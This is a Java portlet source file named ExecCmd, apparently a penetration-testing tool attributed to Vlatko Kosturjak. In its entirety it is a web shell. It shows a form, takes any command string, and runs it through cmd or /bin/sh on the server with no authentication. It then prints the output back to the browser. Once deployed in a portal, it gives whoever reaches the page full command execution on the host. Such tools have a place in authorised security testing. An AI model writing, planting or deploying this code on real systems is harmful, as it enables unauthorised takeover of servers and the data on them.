package org.kost.own;

// Main stuff. (C) Vlatko Kosturjak. Distributed under GPL.

import javax.portlet.*;
import java.io.*;

public class ExecCmd extends GenericPortlet {

	public void init (PortletConfig portletConfig) throws UnavailableException, PortletException
	{
		super.init(portletConfig);
	}

	public void processAction(ActionRequest request, ActionResponse response)
	throws PortletException, PortletSecurityException, IOException
	{
		response.setRenderParameters(request.getParameterMap());
	}


	public void doView(RenderRequest request, RenderResponse response)
	throws PortletException, IOException
	{
		response.setContentType("text/html");
		PrintWriter writer = response.getWriter();

		String osname=System.getProperty("os.name");
		String[] cmdshell = new String[3];
		if (osname.indexOf("Win") >= 0) {
			cmdshell[0]="cmd";
			cmdshell[1]="/c";
		} else {
			cmdshell[0]="/bin/sh";
			cmdshell[1]="-c";
		}

		writer.println("<p>Execute command on "+osname+"</p>");
		writer.println("<p><form action=\""+response.createActionURL()+"\" method=\"POST\">");
		writer.println("<input name=\""+response.getNamespace()+"cmd\" />");
		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
		writer.println("</form></p>");

		cmdshell[2]=request.getParameter(response.getNamespace()+"cmd");

		try {
			if (cmdshell[2] == null) {
				writer.println("<p>No command to execute</p>");
			} else {
				writer.println("<p>Executing: "+cmdshell[2]+"</p>");
				writer.println("<hr><pre>");
				Process p = Runtime.getRuntime().exec(cmdshell);
				OutputStream os = p.getOutputStream();
				InputStream in = p.getInputStream();
				DataInputStream dis = new DataInputStream(in);
				String disr = dis.readLine();
				while ( disr != null ) {
					disr = disr.replaceAll("[>]","&gt;").replaceAll("[<]", "&lt;");
					writer.println(disr);
					disr = dis.readLine();
				}
				writer.println("</pre><hr>");
			}
		} 
		catch(Exception e) {
			writer.println("<p><pre>Exception: "+ e.toString() +"</pre></p>");
		}

	}

}

